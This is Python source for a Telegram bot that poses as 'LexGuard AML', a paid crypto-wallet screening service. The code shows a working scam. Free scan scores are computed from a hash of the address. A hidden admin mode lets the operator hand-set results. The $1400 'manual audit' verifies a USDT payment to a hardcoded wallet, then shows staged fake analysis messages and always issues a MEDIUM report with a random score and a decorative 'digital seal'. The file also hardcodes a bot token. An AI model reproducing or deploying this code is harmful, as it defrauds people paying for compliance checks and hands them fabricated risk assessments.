import os
import re
import hmac
import logging
import hashlib
import asyncio
import random
import textwrap
from io import BytesIO
from decimal import Decimal
from datetime import datetime, timezone
from typing import Tuple

import httpx
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
)
from reportlab.lib.pagesizes import A4
from reportlab.lib.colors import HexColor, white, black
from reportlab.pdfgen import canvas
from reportlab.lib.utils import simpleSplit

# =========================
# PRO CONFIG 5.2 (PDF + DIGITAL SEAL)
# =========================
TOKEN = "8785738588:AAET2CwSmyinOtpnQLzXxo9nEAqXZ18mmFM"
ADMIN_USER_ID = 8061332993

BOT_NAME = "LexGuard AML"
BOT_TAGLINE = "Premium Wallet Screening & Compliance"

FULL_REPORT_PRICE_USD = Decimal("1400")
PAYMENT_NETWORK = "USDT TRC20"
PAYMENT_WALLET = "TRND8fBYLQWuy8xMpmRcq77eTLWrdbBH61"
START_BANNER_PATH = "lexguard_banner.png"

REPORT_SIGNING_SECRET = os.getenv(
    "lexguard_aml_pdf_seal_9f3c7a1e_2026", "CHANGE_THIS_LEXGUARD_SECRET"
)

USDT_TRC20_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
TRONGRID_API_BASE = os.getenv("TRONGRID_API_BASE", "https://api.trongrid.io").rstrip(
    "/"
)
TRONGRID_API_KEY = os.getenv("TRONGRID_API_KEY", "")

TRON_ADDRESS_RE = re.compile(r"^T[1-9A-HJ-NP-Za-km-z]{33}$")
ETH_ADDRESS_RE = re.compile(r"^0x[a-fA-F0-9]{40}$")
TX_HASH_RE = re.compile(r"^(0x)?[A-Fa-f0-9]{32,64}$")

logging.basicConfig(
    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s", level=logging.INFO
)
logger = logging.getLogger("lexguard_pro")


def is_admin(user_id: int) -> bool:
    return user_id == ADMIN_USER_ID


def now_utc() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")


def get_state(context: ContextTypes.DEFAULT_TYPE) -> dict:
    state = context.bot_data
    state.setdefault("risk_mode", "auto")
    return state


def clear_flow(context: ContextTypes.DEFAULT_TYPE) -> None:
    context.user_data.pop("flow", None)
    context.user_data.pop("report_target", None)


def looks_like_target(text: str) -> bool:
    return bool(
        TRON_ADDRESS_RE.match(text)
        or ETH_ADDRESS_RE.match(text)
        or TX_HASH_RE.match(text)
    )


def detect_network(value: str) -> str:
    value = value.strip()
    if TRON_ADDRESS_RE.match(value):
        return "TRON"
    if ETH_ADDRESS_RE.match(value):
        return "EVM / ETH"
    if value.startswith("0x"):
        return "EVM / HASH"
    return "UNKNOWN"


def risk_badge(risk: str) -> str:
    return {
        "LOW": "🟢 <b>LOW RISK</b>",
        "MEDIUM": "🟡 <b>MEDIUM RISK</b>",
        "HIGH": "🔴 <b>HIGH RISK</b>",
    }.get(risk.upper(), "⚪ <b>UNKNOWN RISK</b>")


def auto_risk(target: str) -> Tuple[str, int]:
    n = int(hashlib.sha256(target.encode("utf-8")).hexdigest()[:8], 16) % 100
    if n < 55:
        return "LOW", 12 + (n % 18)
    if n < 82:
        return "MEDIUM", 42 + (n % 18)
    return "HIGH", 78 + (n % 18)


async def verify_trc20_payment(tx_hash: str) -> Tuple[bool, str]:
    raw_tx_hash = tx_hash.strip()
    normalized_tx_hash = raw_tx_hash.replace("0x", "")

    if not TX_HASH_RE.match(raw_tx_hash):
        return False, "❌ Invalid transaction hash format."

    headers = {"Accept": "application/json"}
    if TRONGRID_API_KEY:
        headers["TRON-PRO-API-KEY"] = TRONGRID_API_KEY

    try:
        async with httpx.AsyncClient(timeout=15) as client:
            resp = await client.get(
                f"{TRONGRID_API_BASE}/v1/transactions/{normalized_tx_hash}/events",
                headers=headers,
            )
            resp.raise_for_status()
            events = resp.json().get("data", [])
    except Exception:
        return False, "❌ Node synchronization error. Try again."

    for event in events:
        if str(event.get("event_name", "")).lower() != "transfer":
            continue

        res = event.get("result", {})
        to_addr = res.get("to") or res.get("_to")
        contract = event.get("contract_address")

        if contract == USDT_TRC20_CONTRACT and str(to_addr) == PAYMENT_WALLET:
            val = res.get("value") or res.get("_value")
            try:
                amount = Decimal(str(val)) / Decimal("1000000")
            except Exception:
                amount = Decimal("0")

            if amount >= FULL_REPORT_PRICE_USD:
                return True, f"✅ <b>Payment Confirmed:</b> {amount} USDT."
            return False, f"⚠️ <b>Insufficient funds:</b> Detected {amount} USDT."

    return False, "❌ No matching USDT transfers found to the target wallet."


def _sign_report(payload: str) -> str:
    return (
        hmac.new(
            REPORT_SIGNING_SECRET.encode("utf-8"),
            payload.encode("utf-8"),
            hashlib.sha256,
        )
        .hexdigest()
        .upper()
    )


def _risk_profile(risk_level: str):
    risk_level = risk_level.upper().strip()

    if risk_level == "LOW":
        return {
            "status": "CLEAN",
            "summary": "No major exposure to high-risk sources detected.",
            "flags": "No critical flags",
            "color": HexColor("#18B26B"),
        }

    if risk_level == "MEDIUM":
        return {
            "status": "REVIEW REQUIRED",
            "summary": "Moderate exposure detected. Additional review is recommended.",
            "flags": "Indirect interaction with flagged entities / elevated transactional risk",
            "color": HexColor("#F59E0B"),
        }

    return {
        "status": "HIGH RISK",
        "summary": "Significant risk exposure detected. Manual compliance review is strongly advised.",
        "flags": "Direct or indirect links to suspicious / sanctioned / high-risk flows",
        "color": HexColor("#DC2626"),
    }


def _draw_multiline(
    c,
    text,
    x,
    y,
    max_width,
    font_name="Helvetica",
    font_size=10,
    leading=14,
    color=black,
):
    c.setFillColor(color)
    c.setFont(font_name, font_size)
    lines = simpleSplit(str(text), font_name, font_size, max_width)
    for line in lines:
        c.drawString(x, y, line)
        y -= leading
    return y


def _draw_label_value(c, label, value, x, y, value_max_width):
    c.setFillColor(HexColor("#64748B"))
    c.setFont("Helvetica-Bold", 9)
    c.drawString(x, y, label)

    c.setFillColor(HexColor("#0F172A"))
    c.setFont("Helvetica", 10)
    lines = simpleSplit(str(value), "Helvetica", 10, value_max_width)
    y -= 14
    for line in lines:
        c.drawString(x, y, line)
        y -= 13
    return y - 6


def _draw_digital_seal(c, center_x, center_y, signature_short):
    c.setStrokeColor(HexColor("#F59E0B"))
    c.setLineWidth(2)
    c.circle(center_x, center_y, 42, stroke=1, fill=0)

    c.setStrokeColor(HexColor("#1E40AF"))
    c.setLineWidth(1.2)
    c.circle(center_x, center_y, 32, stroke=1, fill=0)

    c.setFillColor(HexColor("#0F172A"))
    c.setFont("Helvetica-Bold", 8)
    c.drawCentredString(center_x, center_y + 9, "LEXGUARD AML")
    c.setFont("Helvetica", 6)
    c.drawCentredString(center_x, center_y - 1, "lexgord.ml")
    c.drawCentredString(center_x, center_y - 12, signature_short)


def make_report_file(target: str, payment_ref: str, risk: str, score: int) -> BytesIO:
    profile = _risk_profile(risk)
    network = detect_network(target)
    report_id = f"LG-MANUAL-{hashlib.md5(target.encode()).hexdigest()[:8].upper()}"
    issued_at = now_utc()

    signature_payload = "|".join(
        [
            report_id,
            issued_at,
            str(target),
            str(network),
            str(risk).upper(),
            str(score),
            str(payment_ref),
            "CUSTOM MANUAL AUDIT",
        ]
    )
    signature = _sign_report(signature_payload)

    buffer = BytesIO()
    c = canvas.Canvas(buffer, pagesize=A4)
    width, height = A4

    navy = HexColor("#091A3A")
    blue = HexColor("#1D4ED8")
    light_bg = HexColor("#F8FAFC")
    border = HexColor("#DCE3EA")
    dark = HexColor("#0F172A")
    muted = HexColor("#475569")

    c.setFillColor(white)
    c.rect(0, 0, width, height, fill=1, stroke=0)

    c.setFillColor(navy)
    c.rect(0, height - 112, width, 112, fill=1, stroke=0)

    c.setFillColor(white)
    c.setFont("Helvetica-Bold", 24)
    c.drawString(42, height - 52, "LexGuard AML")

    c.setFont("Helvetica", 11)
    c.drawString(42, height - 72, "Premium Manual Audit")
    c.drawString(42, height - 88, "www.lexguard.io")

    c.setFillColor(dark)
    c.setFont("Helvetica-Bold", 16)
    c.drawString(42, height - 145, "Custom Manual Audit Report")

    c.setFillColor(light_bg)
    c.setStrokeColor(border)
    c.roundRect(width - 220, height - 186, 175, 60, 10, fill=1, stroke=1)

    c.setFillColor(muted)
    c.setFont("Helvetica-Bold", 8)
    c.drawString(width - 205, height - 147, "REPORT ID")
    c.drawString(width - 205, height - 167, "ISSUED")

    c.setFillColor(dark)
    c.setFont("Helvetica", 9)
    c.drawString(width - 145, height - 147, report_id)
    c.drawString(width - 145, height - 167, issued_at)

    c.setFillColor(profile["color"])
    c.roundRect(42, height - 206, 150, 28, 8, fill=1, stroke=0)
    c.setFillColor(white)
    c.setFont("Helvetica-Bold", 11)
    c.drawString(56, height - 194, f"RISK: {risk.upper()}")

    c.setFillColor(blue)
    c.roundRect(202, height - 206, 130, 28, 8, fill=1, stroke=0)
    c.setFillColor(white)
    c.setFont("Helvetica-Bold", 11)
    c.drawString(216, height - 194, f"SCORE: {score}/100")

    info_top = height - 238
    c.setFillColor(light_bg)
    c.setStrokeColor(border)
    c.roundRect(42, info_top - 210, width - 84, 210, 12, fill=1, stroke=1)

    left_x = 58
    right_x = 305
    y_left = info_top - 24
    y_right = info_top - 24

    y_left = _draw_label_value(c, "Client Target", target, left_x, y_left, 215)
    y_left = _draw_label_value(c, "Network", network, left_x, y_left, 215)
    y_left = _draw_label_value(c, "Status", profile["status"], left_x, y_left, 215)
    y_left = _draw_label_value(
        c,
        "Methodology",
        "Custom Manual Audit by LexGuard AML Company",
        left_x,
        y_left,
        215,
    )

    y_right = _draw_label_value(
        c, "Payment Network", PAYMENT_NETWORK, right_x, y_right, 220
    )
    y_right = _draw_label_value(c, "Payment Hash", payment_ref, right_x, y_right, 220)
    y_right = _draw_label_value(
        c, "Flags Detected", profile["flags"], right_x, y_right, 220
    )

    summary_y = info_top - 152
    c.setFillColor(HexColor("#64748B"))
    c.setFont("Helvetica-Bold", 9)
    c.drawString(left_x, summary_y, "Summary")

    _draw_multiline(
        c,
        profile["summary"],
        left_x,
        summary_y - 16,
        width - 120,
        font_name="Helvetica",
        font_size=10,
        leading=14,
        color=dark,
    )

    sig_box_y = info_top - 290
    c.setFillColor(white)
    c.setStrokeColor(border)
    c.roundRect(42, sig_box_y - 94, width - 84, 94, 12, fill=1, stroke=1)

    c.setFillColor(dark)
    c.setFont("Helvetica-Bold", 11)
    c.drawString(58, sig_box_y - 20, "Digital Signature")

    c.setFillColor(muted)
    c.setFont("Helvetica", 8)
    sig_lines = textwrap.wrap(signature, width=64)
    y = sig_box_y - 40
    for line in sig_lines[:2]:
        c.drawString(58, y, line)
        y -= 12

    c.setFillColor(muted)
    c.setFont("Helvetica", 9)
    c.drawString(
        58,
        sig_box_y - 76,
        "This signature confirms report integrity and issuance by LexGuard AML.",
    )

    _draw_digital_seal(c, width - 100, sig_box_y - 46, signature[:10])

    footer = (
        "Disclaimer: This report is provided for informational and compliance screening purposes only. "
        "It does not constitute legal, financial, or investment advice."
    )
    _draw_multiline(
        c,
        footer,
        42,
        60,
        width - 84,
        font_name="Helvetica",
        font_size=8,
        leading=11,
        color=HexColor("#64748B"),
    )

    c.showPage()
    c.save()

    buffer.seek(0)
    buffer.name = f"{report_id}.pdf"
    return buffer


def main_menu() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        [
            [InlineKeyboardButton("🔍 Quick Scan (Free)", callback_data="scan")],
            [InlineKeyboardButton("🛡 Custom Manual Audit", callback_data="report")],
            [InlineKeyboardButton("💳 Services & Pricing", callback_data="pricing")],
            [InlineKeyboardButton("🌐 About LexGuard", callback_data="about")],
        ]
    )


def back_menu() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        [[InlineKeyboardButton("⬅ Main Menu", callback_data="back")]]
    )


def payment_methods_menu() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        [
            [InlineKeyboardButton("💰 Bitcoin (BTC)", callback_data="pay:btc")],
            [InlineKeyboardButton("🔷 Ethereum (ETH)", callback_data="pay:eth")],
            [InlineKeyboardButton("💵 Tether (USDT TRC20)", callback_data="pay:usdt")],
            [InlineKeyboardButton("⬅ Back", callback_data="back")],
        ]
    )


def admin_menu(context: ContextTypes.DEFAULT_TYPE) -> InlineKeyboardMarkup:
    state = get_state(context)
    return InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton(
                    f"{'✅ ' if state['risk_mode'] == 'auto' else ''}Auto AI",
                    callback_data="mode:auto",
                ),
                InlineKeyboardButton(
                    f"{'✅ ' if state['risk_mode'] == 'manual' else ''}Manual Intercept",
                    callback_data="mode:manual",
                ),
            ],
            [InlineKeyboardButton("⬅ Main Menu", callback_data="back")],
        ]
    )


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    clear_flow(context)

    if os.path.exists(START_BANNER_PATH):
        with open(START_BANNER_PATH, "rb") as f:
            await update.message.reply_photo(
                photo=f,
                caption="🛡 LexGuard AML\nPremium Wallet Screening",
                parse_mode="HTML",
                reply_markup=main_menu()
            )
        return

    await update.message.reply_text(
        "🛡 LexGuard AML\nSelect an action:",
        reply_markup=main_menu()
    )

    await update.message.reply_text(
        "🛡 LexGuard AML\nSelect an action:",
        reply_markup=main_menu()
    )


async def admin_res(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return

    try:
        parts = update.message.text.split()
        if len(parts) != 4:
            raise ValueError

        target_uid = int(parts[1])
        risk = parts[2].upper()
        score = int(parts[3])

        pending = context.bot_data.get("pending_scans", {}).pop(target_uid, None)
        if not pending:
            await update.message.reply_text("❌ Запрос не найден или уже отвечен.")
            return

        report = (
            f"📊 <b>LEXGUARD SCAN RESULT</b>\n\n"
            f"<b>Target:</b> <code>{pending['target']}</code>\n"
            f"<b>Risk Level:</b> {risk_badge(risk)}\n"
            f"<b>Threat Score:</b> {score}/100\n\n"
            f"<i>Engine: LexGuard Deep Scan | {now_utc()}</i>"
        )

        await context.bot.edit_message_text(
            chat_id=pending["chat_id"],
            message_id=pending["msg_id"],
            text=report,
            parse_mode="HTML",
            reply_markup=back_menu(),
        )
        await update.message.reply_text("✅ Отчет успешно отправлен клиенту!")
    except Exception:
        await update.message.reply_text(
            "❌ Формат: /res <ID> <LOW/MEDIUM/HIGH> <SCORE>"
        )


async def callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    data, uid = q.data, q.from_user.id

    if data in ["pay:btc", "pay:eth"]:
        await q.answer(
            "⚠️ Network congested. Temporarily accepting only USDT TRC20.",
            show_alert=True,
        )
        return

    await q.answer()

    if data == "scan":
        context.user_data["flow"] = "scan"
        await q.edit_message_text(
            "🔍 <b>Quick Scan</b>\n\nEnter the wallet address or TX Hash for verification:",
            parse_mode="HTML",
            reply_markup=back_menu(),
        )

    elif data == "report":
        context.user_data["flow"] = "report_target"
        await q.edit_message_text(
            "🛡 <b>Custom Manual Audit by LexGuard AML</b>\n\n"
            "In-depth analysis with an official verification certificate.\n"
            "Enter the wallet address:",
            parse_mode="HTML",
            reply_markup=back_menu(),
        )

    elif data == "pricing":
        text = (
            f"💳 <b>Services & Pricing</b>\n\n"
            f"• <b>Quick AI Scan:</b> Free (Basic scoring)\n"
            f"• <b>Custom Manual Audit:</b> ${FULL_REPORT_PRICE_USD} "
            f"(Detailed audit by our expert team)\n\n"
            f"<i>We guarantee complete confidentiality.</i>"
        )
        await q.edit_message_text(text, parse_mode="HTML", reply_markup=back_menu())

    elif data == "about":
        await q.edit_message_text(
            "🌐 <b>About LexGuard</b>\n\n"
            "LexGuard AML is a cutting-edge solution to protect your business "
            "from illicit cryptocurrency.\n\n"
            "We conduct comprehensive blockchain analysis, identifying links "
            "to Darknet, mixers, and sanction lists.",
            parse_mode="HTML",
            reply_markup=back_menu(),
        )

    elif data == "back":
        clear_flow(context)
        await q.edit_message_text(
            f"🛡 <b>{BOT_NAME}</b>\n<i>{BOT_TAGLINE}</i>\n\nSelect an action:",
            parse_mode="HTML",
            reply_markup=main_menu(),
        )

    elif data == "pay:usdt":
        context.user_data["flow"] = "report_tx"
        target = context.user_data.get("report_target", "UNKNOWN")
        text = (
            f"🛡 <b>PAYMENT INITIATED</b>\n\n"
            f"🎯 <b>Target:</b> <code>{target}</code>\n"
            f"💳 <b>Amount Due:</b> <b>${FULL_REPORT_PRICE_USD}</b>\n"
            f"🌐 <b>Network:</b> USDT TRC20\n"
            f"💼 <b>Address:</b> <code>{PAYMENT_WALLET}</code>\n\n"
            f"<i>⏳ Send the TX Hash (TXID) here after a successful transfer.</i>"
        )
        await q.edit_message_text(text, parse_mode="HTML", reply_markup=back_menu())

    elif data.startswith("mode:") and is_admin(uid):
        get_state(context)["risk_mode"] = data.split(":")[1]
        await q.edit_message_reply_markup(reply_markup=admin_menu(context))


async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    flow = context.user_data.get("flow", "scan")

    if not looks_like_target(text):
        await update.message.reply_text(
            "⚠️ Invalid format. Please send a valid Wallet Address or TX Hash.",
            reply_markup=back_menu(),
        )
        return

    if flow == "report_target":
        context.user_data["report_target"] = text
        await update.message.reply_text(
            "Select a payment method:", reply_markup=payment_methods_menu()
        )
        return

    if flow == "report_tx":
        target = context.user_data.get("report_target")

        loader = await update.message.reply_text(
            "🔄 <b>Verifying transaction on the TRON network...</b>",
            parse_mode="HTML",
        )

        ok, msg = await verify_trc20_payment(text)
        if not ok:
            await loader.edit_text(
                f"{msg}\n\nPlease check the Hash and try again.",
                parse_mode="HTML",
                reply_markup=back_menu(),
            )
            return

        delay_seconds = random.randint(3, 8) * 60

        await loader.edit_text(
            f"{msg}\n\n🕵️‍♂️ <b>Payment received. Initiating deep manual analysis...</b>",
            parse_mode="HTML",
        )
        await asyncio.sleep(delay_seconds / 2)

        await loader.edit_text(
            f"{msg}\n\n🕵️‍♂️ <b>Analysis in progress... Cross-referencing Darknet databases.</b>",
            parse_mode="HTML",
        )
        await asyncio.sleep(delay_seconds / 2)

        final_score = random.randint(34, 38)
        final_risk = "MEDIUM"

        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=InputFile(make_report_file(target, text, final_risk, final_score)),
            caption=(
                f"📄 <b>Custom Manual Audit Completed</b>\n\n"
                f"<b>Target:</b> <code>{target}</code>\n"
                f"<b>Risk Level:</b> {risk_badge(final_risk)}\n"
                f"<b>Threat Score:</b> {final_score}/100\n\n"
                f"<i>Report prepared by LexGuard AML experts.</i>"
            ),
            parse_mode="HTML",
            reply_markup=back_menu(),
        )

        await loader.delete()
        clear_flow(context)
        return

    state = get_state(context)
    if state["risk_mode"] == "manual":
        loader = await update.message.reply_text(
            "🔎 <b>Scanning nodes and analyzing connections...</b>\n"
            "<i>Connecting to deep-tier nodes, please wait...</i>",
            parse_mode="HTML",
        )

        context.bot_data.setdefault("pending_scans", {})[update.effective_user.id] = {
            "chat_id": update.effective_chat.id,
            "msg_id": loader.message_id,
            "target": text,
        }

        admin_msg = (
            f"🚨 <b>НОВЫЙ ЗАПРОС НА СКАНИРОВАНИЕ</b>\n\n"
            f"👤 Юзер ID: <code>{update.effective_user.id}</code>\n"
            f"🎯 Кошелек: <code>{text}</code>\n\n"
            f"⚡️ <b>Скопируй и отправь команду с результатом:</b>\n"
            f"<code>/res {update.effective_user.id} LOW 15</code>\n"
            f"<code>/res {update.effective_user.id} MEDIUM 55</code>\n"
            f"<code>/res {update.effective_user.id} HIGH 89</code>"
        )

        await context.bot.send_message(
            chat_id=ADMIN_USER_ID,
            text=admin_msg,
            parse_mode="HTML",
        )
        return

    loader = await update.message.reply_text(
        "🔎 <b>Scanning nodes and analyzing connections...</b>",
        parse_mode="HTML",
    )
    await asyncio.sleep(1.5)
    risk, score = auto_risk(text)

    report = (
        f"📊 <b>LEXGUARD SCAN RESULT</b>\n\n"
        f"<b>Target:</b> <code>{text}</code>\n"
        f"<b>Risk Level:</b> {risk_badge(risk)}\n"
        f"<b>Threat Score:</b> {score}/100\n\n"
        f"<i>Engine: LexGuard AI Fast Engine | {now_utc()}</i>"
    )
    await loader.edit_text(report, parse_mode="HTML", reply_markup=back_menu())
    clear_flow(context)


def main():
    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(
        CommandHandler(
            "admin",
            lambda u, c: u.message.reply_text(
                "⚙️ Admin Panel",
                reply_markup=admin_menu(c),
            )
            if is_admin(u.effective_user.id)
            else None,
        )
    )
    app.add_handler(CommandHandler("res", admin_res))
    app.add_handler(CallbackQueryHandler(callbacks))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))

    logger.info("LexGuard Pro Intercept Module Active.")
    app.run_polling()


if __name__ == "__main__":
    main()
